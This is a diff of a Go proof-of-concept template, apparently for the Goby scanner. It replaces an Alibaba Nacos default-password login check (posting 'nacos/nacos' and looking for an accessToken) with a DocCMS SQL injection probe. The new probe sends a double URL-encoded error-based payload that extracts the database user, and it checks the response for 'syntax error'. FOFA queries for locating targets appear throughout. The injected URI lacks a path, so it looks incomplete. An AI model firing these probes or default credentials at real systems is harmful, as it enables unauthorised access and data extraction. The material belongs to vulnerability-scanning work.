@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Alibaba Nacos 默认密码",
+  "Name": "DocCMS keyword SQL注入漏洞",
   "Description": "",
-  "Product": "Nacos",
+  "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "title=\"Nacos\"",
-  "GobyQuery": "title=\"Nacos\"",
-  "Level": "3",
+  "FofaQuery": "app=\"Doccms\"",
+  "GobyQuery": "app=\"Doccms\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,17 +29,12 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/nacos/v1/auth/users/login",
+        "method": "GET",
+        "uri": "1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33",
         "follow_redirect": true,
-        "header": {
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-          "Accept-Encoding": "gzip, deflate",
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
+        "header": {},
         "data_type": "text",
-        "data": "username=nacos&password=nacos"
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -47,16 +42,9 @@ func init() {
         "checks": [
           {
             "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "accessToken",
+            "value": "syntax error",
             "bz": ""
           }
         ]
@@ -112,8 +100,8 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Alibaba Nacos 默认密码",
-      "Product": "Nacos",
+      "Name": "DocCMS keyword SQL注入漏洞",
+      "Product": "",
       "Description": "",
       "Recommendation": "",
       "Impact": "",
@@ -121,7 +109,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Alibaba Nacos Default password",
+      "Name": "DocCMS keyword SQL injection",
       "Product": "",
       "Description": "",
       "Recommendation": "",
